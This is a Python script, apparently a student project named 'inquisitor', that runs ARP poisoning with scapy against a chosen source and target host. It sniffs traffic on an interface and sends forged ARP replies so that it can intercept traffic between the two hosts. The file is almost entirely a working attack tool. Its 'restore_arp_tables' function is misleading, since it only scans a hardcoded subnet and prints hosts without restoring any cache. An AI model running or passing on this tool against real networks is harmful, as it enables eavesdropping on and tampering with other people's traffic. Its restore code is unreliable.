#!/usr/bin/env python3


import sys, socket, argparse, re
from scapy.all import ARP, Ether, srp, sniff, sendp, conf


def validate_ipv4(address):
    pattern = re.compile(r"^(?:(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)$")
    return bool(pattern.match(address))


def restore_arp_tables(interface):
    arp_request = ARP(pdst="192.168.1.0/24")
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    
    answered_list, unanswered_list = srp(arp_request_broadcast, timeout=3, verbose=False, iface=interface)
    
    clients_list = []
    for element in answered_list:
        client_dict = {"ip": element[1].psrc, "mac": element[1].hwsrc}
        clients_list.append(client_dict)
        print(f"IP Address: {element[1].psrc}, MAC Address: {element[1].hwsrc}")


def arp_poison(src_ip, src_mac, target_ip, target_mac, interface='eth0'):
    def poison_packet(pkt):
        if pkt[Ether].src == src_mac and pkt[Ether].dst == target_mac:
            newpkt = Ether(dst=target_mac, src=src_mac) / ARP(op=2, pdst=target_ip, psrc=src_ip)
            sendp(newpkt, iface=interface)
        elif pkt[Ether].src == target_mac and pkt[Ether].dst == src_mac:
            newpkt = Ether(dst=src_mac, src=target_mac) / ARP(op=2, pdst=src_ip, psrc=target_ip)
            sendp(newpkt, iface=interface)

    try:
        print("ARP Poisoning started. Press CTRL+C to stop.")
        sniff(iface=interface, prn=lambda x: poison_packet(x))
    except KeyboardInterrupt:
        restore_arp_tables(interface)
        print("ARP Poisoning stopped.")


def ft_parser_args():
    parser = argparse.ArgumentParser(description='ARP poisoning,./inquisitor <IP-src> <MAC-src> <IP-target> <MAC-target>')
    parser.add_argument('addresses', action='store', nargs=4, help="<IP-src> <MAC-src> <IP-target> <MAC-target>")
    return parser.parse_args()


def main():
    args = ft_parser_args()
    try:
        ip_src, mac_src, ip_target, mac_target = args.addresses
        if not validate_ipv4(ip_src) or not validate_ipv4(ip_target):
            print("Invalid IP address format. Please use IPv4 addresses.")
            exit(1)
        print("Valid IP addresses entered.")
        arp_poison(ip_src, mac_src, ip_target, mac_target)
        print("ARP Poisoning completed successfully.")
    except ValueError:
        print("Invalid IP address format. Please use IPv4 addresses.")
    except Exception as e:
        print(f"An unexpected error occurred: {e}")


if __name__ == "__main__":
    main()